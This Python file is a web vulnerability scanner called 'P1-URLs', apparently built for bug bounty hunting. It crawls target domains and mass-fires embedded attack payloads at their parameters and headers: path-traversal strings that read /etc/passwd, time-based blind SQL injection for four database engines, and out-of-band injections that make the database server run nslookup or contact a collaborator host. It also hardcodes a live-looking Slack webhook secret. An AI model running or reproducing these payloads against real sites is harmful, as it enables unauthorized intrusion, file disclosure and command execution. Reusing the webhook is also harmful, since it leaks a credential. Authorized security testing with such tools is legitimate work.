#!/usr/bin/env python3
"""
P1-URLs.py - v1.8.0 Definitive Production Release

This is the final, stable version of the P1-URLs scanner. It combines
a high-speed, concurrent workflow with advanced, evasive vulnerability
testing modules for LFI and Blind SQLi (Time-based and OOB).
"""

import subprocess
import argparse
import os
import re
import shutil
import sys
import time
import random
import string
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from difflib import SequenceMatcher
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
import requests
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress insecure request warnings for HTTPS requests without certificate validation
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================================================================
# === Config ===
# ==============================================================================
SLACK_WEBHOOK = "https://hooks.slack.com/services/T03JPK11LNM/B0908RQP1GB/hrmkhkKGbO72J0OMa9g4kb0" 

# File paths are relative; they will be placed inside a unique scan directory
BULK_URLS_OUTPUT = "target_bulk_urls.txt"
DEDUPED_URLS = "unique_urls_filtered.txt"

# Core tool and testing configuration
GF_PATTERNS = ["lfi", "rce", "redirect", "sqli", "ssrf", "ssti", "xss"]
KATANA_CONCURRENCY = 25
CONCURRENCY = 25  # Concurrency for custom LFI & SQLi tests
TIME_DELAY = 6
REQUEST_TIMEOUT = 8  # Adjusted to be TIME_DELAY + 2
CLEAN_BASE_HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Language": "en-US,en;q=0.9"}
HEADERS_TO_TEST = ["User-Agent", "Referer", "X-Forwarded-For", "X-Client-IP", "X-Real-IP", "Origin", "CF-Connecting-IP"]
METHODS_TO_TEST = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
LFI_SIMILARITY_THRESHOLD = 0.9 
LFI_CONFIDENCE_STRINGS = {"Linux /etc/passwd": r"root:(x|\*|\$[^:]*):0:0:","Windows boot.ini": r"\[boot loader\]|\[operating systems\]","PHP data:// Wrapper Exec": r"40212b72c3a51610a26e848608871439","Base64 Linux /etc/passwd": r"cm9vdDo="}

# ==============================================================================
# === EMBEDDED PAYLOADS ===
# ==============================================================================
DEFAULT_LFI_PAYLOADS = ["../../../../../../../../etc/passwd","/etc/passwd","../../../../../../../../windows/win.ini","/windows/win.ini","c:\\boot.ini","..\\..\\..\\boot.ini","../../../../../../../../etc/passwd%00","../../../../../../../../boot.ini%00","..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd","php://filter/convert.base64-encode/resource=/etc/passwd","php://filter/resource=/etc/passwd","php://filter/read=string.rot13/resource=/etc/passwd","data:text/plain;base64,PD9waHAgZWNobyBtZDUoJ3AxbmN1c3RvbScpOyA/Pg==","L2V0Yy9wYXNzd2Q=","//..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/..\\/etc/passwd","///////../../../etc/passwd","../../../../../../../../../../../../../etc/passwd","//////////////////../../../../../../../../etc/passwd",".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd","%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/À®À®/etc/passwd","file:/etc/passwd", "file:///etc/passwd"]
for i in range(2, 20): DEFAULT_LFI_PAYLOADS.extend([('../' * i) + 'etc/passwd', ('../' * i) + 'windows/win.ini', ('%2e%2e/' * i) + 'etc/passwd'])
BLIND_SQLI_PAYLOADS = {"MySQL": ["0'XOR(if(now()=sysdate(),sleep({delay}),0))XOR'Z","0'XOR(if(now()=sysdate(),sleep({delay}),0))+XOR'Z","0\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"Z","{val}' XOR IF(NOW()=SYSDATE(),SLEEP({delay}),0) XOR 'Z'","X'XOR(if(now()=sysdate(),sleep({delay}),0))XOR'X","\"XOR(if(now()=sysdate(),sleep({delay}),0))XOR\"","{val}' XOR (SELECT * FROM (SELECT(SLEEP({delay})))a)-- -","' OR IF(ASCII(SUBSTR(user(),1,1))=114,SLEEP({delay}),0)--","{val}'+AND+(SELECT+1848+FROM+(SELECT(SLEEP({delay})))OHwd)--+FnqF", "{val}';(SELECT*FROM(SELECT(SLEEP({delay})))a)", "{val}')) or sleep({delay})='", "{val}\");SELECT+SLEEP({delay})#", "{val}' AND SLEEP({delay})-- -", "{val}\" AND SLEEP({delay})-- -","{val}' AND (SELECT*FROM(SELECT(SLEEP({delay})))a)","{val} AND (SELECT * from (SELECT(SLEEP({delay})))a)"],"PostgreSQL": ["1' AND (SELECT 1)=(SELECT 1) XOR (SELECT pg_sleep({delay})) IS NULL--", "';SELECT pg_sleep({delay})--", "'||(SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE 'a' END)--", "'OR 1=(SELECT CASE WHEN (1=1) THEN PG_SLEEP({delay}) ELSE NULL END)--", "1 AND CAST(pg_sleep({delay}) AS varchar) IS NULL"],"MSSQL": ["1' OR 1=(SELECT 1 WHERE 1=1^0); WAITFOR DELAY '0:0:{delay}'--", "';+IF+(1=1)+WAITFOR+DELAY+'0:0:{delay}'--", "';%20waitfor%20delay%20'0:0:{delay}'%20--%20", "';waitfor delay '0:0:{delay}'--", "';+WAITFOR+DELAY+'00:00:{delay}'--", "(' waitfor delay'0:0:{delay}'--)", ");waitfor delay '0:0:{delay}'--", "\";waitfor delay '0:0:{delay}'--", "');waitfor delay '0:0:{delay}'--", "\"));waitfor delay '0:0:{delay}'--", "));waitfor delay '0:0:{delay}'--"],"Oracle": ["orwa'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),{delay})||'", "{val}' AND (SELECT 1 FROM DUAL WHERE 1=DECODE(1,1,DBMS_LOCK.SLEEP({delay}),0))>0--", "{val}' AND DBMS_LOCK.SLEEP({delay})-- -", "'; BEGIN DBMS_LOCK.SLEEP({delay}); END;--"]}
OOB_SQLI_PAYLOADS = {"MySQL": ["{val}' AND IF(1=1, (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{oob_id}.p1_mysql.', '{collab_url}','\\\\a.txt'))), 0)-- -"],"PostgreSQL": ["';COPY (SELECT '') FROM PROGRAM 'nslookup {oob_id}.p1_pg.{collab_url}';--"],"MSSQL": ["'; exec master..xp_dirtree '\\\\{oob_id}.p1_mssql.{collab_url}\\a';--"],"Oracle": ["AND (SELECT UTL_HTTP.REQUEST('http://{oob_id}.p1_oracle.{collab_url}') FROM DUAL) IS NOT NULL","AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{oob_id}.p1_oracle_dns.{collab_url}') FROM DUAL) IS NOT NULL", "AND 1=CASE WHEN (1=1) THEN (SELECT UTL_INADDR.GET_HOST_NAME('127.0.0.1','{oob_id}.p1_oracle_case.{collab_url}') FROM DUAL) ELSE 0 END"]}

console = Console()

# ==============================================================================
# === Helper & Core Functions ===
# ==============================================================================
def print_banner():
    def typewriter_effect(text, delay=0.01, style=""):
        console.print(f"[{style}]", end="");
        for char in text: console.print(f"[{style}]{char}[/{style}]", end=""); sys.stdout.flush(); time.sleep(delay)
        print()
    os.system('cls' if os.name == 'nt' else 'clear'); console.print("[bold cyan]Booting P1-URLs Scanner...[/bold cyan]"); time.sleep(0.5)
    for _ in range(5): console.print(f"[bold green]{''.join(random.choice('01 ') for _ in range(os.get_terminal_size().columns))}[/bold green]", overflow="hidden", no_wrap=True); time.sleep(0.02)
    ascii_art_lines = ["██████╗  ██╗    ██████╗ ██████╗ ██╗     ███████╗","██╔══██╗ ██║    ██╔══██╗██╔══██╗██║     ██╔════╝","██████╔╝ ██║    ██║  ██║██████╔╝██║     ███████╗","██╔═══╝  ██║    ██║  ██║██╔══██╗██║     ╚════██║","██║      ███████╗██████╔╝██║  ██║███████╗███████║","╚═╝      ╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝"]
    console.print("\n[bold red]Initializing Mainframe...[/bold red]"); final_panel_text = []
    for line in ascii_art_lines: console.print(f"[bold cyan]{line}[/bold cyan]", highlight=False); final_panel_text.append(f"[bold cyan]{line}[/bold cyan]"); time.sleep(0.05)
    subtitle_text = "\n[yellow]v1.8.0 Definitive Production Release[/yellow]\n"; typewriter_effect(subtitle_text, style="yellow"); final_panel_text.append(subtitle_text); time.sleep(0.5)
    final_footer = "[bold green]by bugcrowd.com/realvivek[/]  [dim]|[/]  [bold sky_blue3]x.com/starkcharry[/]"; panel = Panel("\n".join(final_panel_text),title="[bold red]P1 URLs[/]", subtitle=final_footer, subtitle_align="right", border_style="bold blue", padding=(1, 2))
    os.system('cls' if os.name == 'nt' else 'clear'); console.print(panel); time.sleep(1)

def send_status_update(message):
    try: requests.post(SLACK_WEBHOOK, json={"text": message}, timeout=5, verify=False)
    except requests.RequestException: pass

def check_dependencies():
    console.print("[bold yellow][*] Checking for required tools...[/]")
    tools = ["katana", "uro", "gf", "nuclei"]; all_found = all(shutil.which(tool) for tool in tools)
    if not all_found: [console.print(f"[bold red][!] Tool not found in PATH:[/] {tool}") for tool in tools if not shutil.which(tool)]; console.print("[bold red][!] Please install the missing tools.[/]"); exit(1)
    console.print("[bold green][✔] All tools are installed.[/]")

def report_and_log(title, details, log_file, severity="CRITICAL", icon="🚨"):
    console.print(Panel(f"[bold white]{title}[/bold white]\n" + "\n".join(f"[bold cyan]• {k}:[/bold cyan] [white]{v}[/white]" for k, v in details.items()), border_style="bold green", expand=False))
    slack_message = (f"{icon} *{title}*\n" f"• *Severity:* `{severity}`\n") + "".join((f"• *{k}:* ```{v}```\n" if 'Payload' in k or 'Command' in k else f"• *{k}:* `{v}`\n") for k, v in details.items())
    try: requests.post(SLACK_WEBHOOK, json={"text": slack_message}, timeout=10, verify=False)
    except requests.RequestException as e: console.print(f"[red]Slack alert failed: {e}[/red]")
    with open(log_file, "a") as f: f.write(json.dumps({"title": title, "severity": severity, **details}) + "\n")

def log_oob_attempt(oob_id, full_details, log_file):
    console.print(Panel(f"[bold white]Firing OOB SQLi Payload[/bold white]\n" + "\n".join(f"[bold cyan]• {k}:[/bold cyan] [white]{v}[/white]" for k, v in {"OOB ID": oob_id, **full_details}.items()), border_style="yellow", expand=False))
    with open(log_file, "a") as f: f.write(json.dumps({"oob_id": oob_id, **full_details}) + "\n")

def run_command(command, stdin_data=None):
    try: return subprocess.run(command, input=stdin_data, capture_output=True, text=True, check=False).stdout
    except FileNotFoundError: console.print(f"[bold red][!] Command not found: {command[0]}.[/]"); return None

def gather_urls(input_file, output_file):
    console.print("[bold cyan]Step 1: Gathering URLs with Katana (Bulk Mode)[/]");
    with open(input_file) as f: domains = f.read()
    if not domains.strip(): console.print("[yellow][!] Input file is empty.[/yellow]"); Path(output_file).touch(); return
    katana_cmd = ["katana", "-silent", "-nc", "-jc", "-kf", "-fx", "-xhr", "-ef", "woff,css,png,svg,jpg,woff2,jpeg,gif,svg", "-c", str(KATANA_CONCURRENCY)]; console.print(f"[*] Beginning bulk crawl on {len(domains.strip().split())} domains...")
    katana_result = run_command(katana_cmd, stdin_data=domains)
    if katana_result:
        with open(output_file, 'w') as out: out.write(katana_result)
        console.print(f"[bold green][✔] Katana bulk scan complete.[/bold green]")
    else: console.print("[bold yellow][-] Katana found no URLs.[/bold yellow]"); Path(output_file).touch()

def run_uro(input_file, output_file):
    console.print("\n[bold cyan]Step 2: Deduplicating URLs[/]")
    with open(input_file) as f: raw_urls = f.read()
    if not raw_urls.strip(): console.print("[yellow][-] No URLs to deduplicate.[/yellow]"); Path(output_file).touch(); return
    uro_result = run_command(["uro"], stdin_data=raw_urls)
    if uro_result:
        with open(output_file, "w") as out: out.write(uro_result)
    console.print(f"[bold green][✔] Deduplication complete. Unique URLs: {len(uro_result.strip().split()) if uro_result and uro_result.strip() else 0}[/bold green]")

def run_gf(input_file, gf_output_dir, basefile):
    console.print("\n[bold cyan]Step 3: Classifying URLs with GF[/]")
    if not Path(input_file).exists() or Path(input_file).stat().st_size == 0: console.print("[yellow][-] No URLs to classify.[/yellow]"); return
    with open(input_file) as f: urls_to_classify = f.read()
    for pattern in GF_PATTERNS:
        result = run_command(["gf", pattern], stdin_data=urls_to_classify)
        if result and result.strip():
            with open(gf_output_dir / f"{basefile}_{pattern}.txt", "w") as out: out.write(result); console.print(f"    [bold green][✔] Found {len(result.strip().split())} potential '{pattern}' URLs.[/bold green]")
    console.print("[bold green][✔] GF classification complete.[/bold green]")

def check_lfi_payload(session, base_content, param, lfi_payload, query_params, parsed_url):
    malicious_url = urlunparse(parsed_url._replace(query=urlencode({**query_params, param: lfi_payload}, doseq=True)))
    try:
        attack_resp = session.get(malicious_url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False); attack_content = attack_resp.text
        if SequenceMatcher(None, base_content, attack_content).ratio() < LFI_SIMILARITY_THRESHOLD:
            for rule_name, pattern in LFI_CONFIDENCE_STRINGS.items():
                if re.search(pattern, attack_content, re.IGNORECASE): return {"url": malicious_url, "param": param, "rule": rule_name, "payload": lfi_payload}
    except requests.RequestException: pass
    return None

def test_lfi_dynamically(lfi_urls_file, args, lfi_results_file):
    console.print(f"\n[bold cyan]Step 4: LFI Testing (Concurrency: {CONCURRENCY})...[/]")
    if not lfi_urls_file.exists() or lfi_urls_file.stat().st_size == 0: return
    lfi_payloads = DEFAULT_LFI_PAYLOADS
    if args.lfi_payloads:
        with open(Path(args.lfi_payloads)) as f: lfi_payloads = [line.strip() for line in f if line.strip()]
    with open(lfi_urls_file) as f: urls_to_test = [line.strip() for line in f if line.strip()]
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures, session = {}, requests.Session()
        for url in urls_to_test:
            try: base_resp = session.get(url, headers=CLEAN_BASE_HEADERS, timeout=REQUEST_TIMEOUT, verify=False); base_content = base_resp.text
            except requests.RequestException: continue
            parsed_url = urlparse(url); query_params = parse_qs(parsed_url.query, keep_blank_values=True)
            for param in query_params:
                for payload in lfi_payloads: futures[executor.submit(check_lfi_payload, session, base_content, param, payload, query_params, parsed_url)] = (param, url)
        found_params = set()
        for future in as_completed(futures):
            param_key = f"{futures[future][1]}_{futures[future][0]}"
            if param_key not in found_params and (result := future.result()):
                report_and_log("Vivek - LFI Vulnerability Found", {"Vulnerable URL": result['url'], "Parameter": result['param'], "Detection Rule": result['rule'], "Payload Used": result['payload']}, lfi_results_file, severity="HIGH")
                found_params.add(param_key)
    console.print(f"[bold green][✔] LFI scan complete.[/bold green]")

def generate_oob_id(size=6, chars=string.ascii_lowercase + string.digits): return ''.join(random.choice(chars) for _ in range(size))

def generate_curl_command(url, method, headers):
    command = f"curl -k -X {method.upper()} '{url}'" # -k to ignore SSL errors like we do
    for key, value in headers.items(): command += f" -H '{key}: {value}'"
    if method.upper() in ["POST", "PUT", "PATCH"]: command += " --data 'p1=p1'"
    return command

def _check_sqli_vulnerability_time(target_url, method, headers):
    try:
        start_baseline = time.time(); requests.request(method.upper(), urlparse(target_url)._replace(query="").geturl(), headers=CLEAN_BASE_HEADERS, timeout=5, verify=False); baseline_duration = time.time() - start_baseline
        start_attack = time.time(); requests.request(method.upper(), target_url, headers=headers, data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None, timeout=(TIME_DELAY + 5), verify=False); attack_duration = time.time() - start_attack
        if (attack_duration > TIME_DELAY) and (attack_duration - baseline_duration > TIME_DELAY * 0.8): return True, attack_duration
    except requests.exceptions.Timeout:
        return True, time.time() - start_attack
    except requests.exceptions.RequestException: pass
    return False, 0

def _fire_oob_payload(target_url, method, headers, oob_id, oob_log_file, full_details):
    log_oob_attempt(oob_id, full_details, oob_log_file)
    try: requests.request(method.upper(), target_url, headers=headers, data={"p1":"p1"} if method.upper() in ["POST", "PUT", "PATCH"] else None, timeout=5, verify=False)
    except requests.RequestException: pass

def check_sqli_payload(url, method, payload, injection_point_type, injection_point_name, db_name, test_type="Time-Based", oob_id=None, oob_log_file=None):
    headers, malicious_url = CLEAN_BASE_HEADERS.copy(), url
    if injection_point_type == "Parameter": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode({**parse_qs(urlparse(url).query, keep_blank_values=True), injection_point_name: payload}, doseq=True)))
    elif injection_point_type == "Parameter-HPP": malicious_url = urlunparse(urlparse(url)._replace(query=urlencode(list(parse_qs(urlparse(url).query, keep_blank_values=True).items()) + [(injection_point_name, payload)], doseq=True)))
    elif injection_point_type == "Header": headers[injection_point_name] = payload
    if test_type == "Time-Based":
        is_vuln, time_taken = _check_sqli_vulnerability_time(malicious_url, method, headers)
        if is_vuln: return {"url": url, "db": db_name, "payload": payload, "details": {"Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Type": "Time-Based", "Time Taken": f"{time_taken:.2f}s", "Curl Command": generate_curl_command(malicious_url, method, headers)}}
    elif test_type == "OOB" and oob_id and oob_log_file:
        _fire_oob_payload(malicious_url, method, headers, oob_id, oob_log_file, {"URL": url, "Injection Point": f"{injection_point_type}: {injection_point_name}", "Method": method, "Payload Used": payload})
    return None

def test_blind_sqli(sqli_urls_file, blind_sqli_results_file, oob_log_file, args):
    console.print(f"\n[bold cyan]Step 5: SQLi Testing (Concurrency: {CONCURRENCY})...[/]")
    if not sqli_urls_file.exists() or sqli_urls_file.stat().st_size == 0: return
    with open(sqli_urls_file) as f: urls = [line.strip() for line in f]; random.shuffle(urls)
    all_test_cases, collab_host = [], None
    console.print("[*] Preparing SQLi test cases...");
    if args.collab_url: collab_host = urlparse(args.collab_url).netloc or args.collab_url; send_status_update(f"   ...OOB testing active. Monitor `{collab_host}` and `{oob_log_file}`.")
    for url in urls:
        original_params = parse_qs(urlparse(url).query, keep_blank_values=True)
        for param, values in original_params.items():
            for db, payloads in BLIND_SQLI_PAYLOADS.items():
                for p_template in payloads:
                    payload = p_template.format(delay=TIME_DELAY, val=(values[0] if values else "")); all_test_cases.extend([(url, "GET", payload, "Parameter", param, db, "Time-Based", None, None), (url, "GET", payload, "Parameter-HPP", param, db, "Time-Based", None, None)])
            if collab_host:
                for db, payloads in OOB_SQLI_PAYLOADS.items():
                    for p_template in payloads:
                        oob_id = generate_oob_id(); payload = p_template.format(oob_id=oob_id, collab_url=collab_host, val=(values[0] if values else "")); all_test_cases.extend([(url, "GET", payload, "Parameter", param, db, "OOB", oob_id, oob_log_file), (url, "GET", payload, "Parameter-HPP", param, db, "OOB", oob_id, oob_log_file)])
        for method in METHODS_TO_TEST:
            for header in HEADERS_TO_TEST:
                for db, payloads in BLIND_SQLI_PAYLOADS.items():
                    for p_template in payloads:
                        payload = p_template.format(delay=TIME_DELAY, val=""); all_test_cases.append((url, method, payload, "Header", header, db, "Time-Based", None, None))
                if collab_host:
                    for db, payloads in OOB_SQLI_PAYLOADS.items():
                        for p_template in payloads:
                            oob_id = generate_oob_id(); payload = p_template.format(oob_id=oob_id, collab_url=collab_host, val=""); all_test_cases.append((url, method, payload, "Header", header, db, "OOB", oob_id, oob_log_file))

    send_status_update(f"⚙️ `[5/{'6' if not args.use_urls else '5'}]` Starting Blind SQLi testing with *{len(all_test_cases)}* total checks."); console.print(f"[*] Submitting {len(all_test_cases)} SQLi tests...")
    found_vuln_keys = set()
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        futures = {executor.submit(check_sqli_payload, *case): case for case in all_test_cases}
        for future in as_completed(futures):
            if (result := future.result()) and (vuln_key := f"{result['url']}_{result['details']['Injection Point']}") not in found_vuln_keys:
                found_vuln_keys.add(vuln_key); 
                report_and_log("Vivek - Blind SQLi Vulnerability Found", {"URL": result['url'],**result['details']}, blind_sqli_results_file)
    console.print(f"[bold green][✔] High-Throughput Blind SQLi scan complete.[/bold green]")


def run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_findings_file):
    console.print(f"\n[bold cyan]Step 6: Nuclei Scanning...[/]")
    for pattern in GF_PATTERNS:
        if pattern in ['sqli', 'lfi']: continue
        file_path = Path(gf_dir) / f"{basefile}_{pattern}.txt"
        if not file_path.exists() or file_path.stat().st_size == 0: continue
        console.print(f"[*] Scanning for [bold magenta]{pattern}[/]..."); 
        output_path = Path(nuclei_dir) / f"{basefile}_{pattern}_nuclei.jsonl"; nuclei_cmd = ["nuclei", "-l", str(file_path), "-jsonl", "-o", str(output_path), "-rate-limit", "150", "-tags", pattern, "-silent"]
        run_command(nuclei_cmd)
        if output_path.exists() and output_path.stat().st_size > 0:
            with open(output_path) as f:
                for line in f:
                    try:
                        result = json.loads(line); info = result.get("info", {})
                        report_and_log("Vivek - Nuclei Vulnerability Found", {"Vulnerability": result.get("template-id", "N/A").upper(), "URL": result.get("matched-at", "N/A"), "Template": info.get("name", "N/A")}, nuclei_findings_file, severity=info.get("severity", "N/A").upper())
                    except (json.JSONDecodeError, KeyError): continue
    console.print("[bold green][✔] Nuclei scanning complete.[/bold green]")


def main():
    parser = argparse.ArgumentParser(description="P1-URLs Scanner - v1.7.2")
    parser.add_argument("-l", "--list", required=True, help="Path to subdomains or URLs.")
    parser.add_argument("-u", "--use-urls", action="store_true", help="Skip discovery, use file as URLs.")
    parser.add_argument("-p", "--lfi-payloads", help="Optional: Path to custom LFI payloads.")
    parser.add_argument("-c", "--collab-url", help="Collaborator URL for Out-of-Band (OOB) SQLi checks.")
    args = parser.parse_args();
    input_file, basefile = Path(args.list), Path(args.list).stem
    if not input_file.is_file(): console.print(f"[red][!] Input file not found:[/] {input_file}"); return
    output_dir = Path(f"scan_results_{basefile}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}"); console.print(f"[bold bright_blue]Creating isolated scan directory: {output_dir}[/]")
    if output_dir.exists(): shutil.rmtree(output_dir)
    gf_dir, nuclei_dir = output_dir/"gf_results", output_dir/"nuclei_results"; os.makedirs(gf_dir); os.makedirs(nuclei_dir)
    
    lfi_file, sqli_file, nuclei_file, oob_file = output_dir/"lfi_vulnerable.json", output_dir/"blind_sqli_vulnerable.json", output_dir/"nuclei_findings.json", output_dir/"oob_requests.log"
    deduped_urls_path = output_dir / DEDUPED_URLS
    
    send_status_update(f"🚀 *Scan Started* on `{basefile}`...")
    if args.use_urls:
        workflow = [("Deduplicating URLs...", lambda: run_uro(str(input_file), deduped_urls_path)),
                    ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)),
                    ("LFI Analysis...", lambda: test_lfi_dynamically(gf_dir/f"{basefile}_lfi.txt", args, lfi_file)), 
                    ("Blind SQLi Analysis...", lambda: test_blind_sqli(gf_dir/f"{basefile}_sqli.txt", sqli_file, oob_file, args)),
                    ("Nuclei Scanning...", lambda: run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_file))]
    else:
        workflow = [("Gathering URLs...", lambda: gather_urls(str(input_file), output_dir/BULK_URLS_OUTPUT)),
                    ("Deduplicating URLs...", lambda: run_uro(output_dir/BULK_URLS_OUTPUT, deduped_urls_path)),
                    ("Classifying URLs...", lambda: run_gf(deduped_urls_path, gf_dir, basefile)),
                    ("LFI Analysis...", lambda: test_lfi_dynamically(gf_dir/f"{basefile}_lfi.txt", args, lfi_file)),
                    ("Blind SQLi Analysis...", lambda: test_blind_sqli(gf_dir/f"{basefile}_sqli.txt", sqli_file, oob_file, args)),
                    ("Nuclei Scanning...", lambda: run_nuclei(gf_dir, nuclei_dir, basefile, nuclei_file))]

    for i, (name, func) in enumerate(workflow, 1):
        send_status_update(f"⚙️ `[{i}/{len(workflow)}]` Starting {name}")
        func()
        
    console.print(f"\n[bold green][✔] All tasks complete! Results are in: {output_dir}[/bold green]"); send_status_update(f"✅ *Scan Complete* for `{basefile}`.")

if __name__ == "__main__":
    print_banner()
    check_dependencies()
    main()
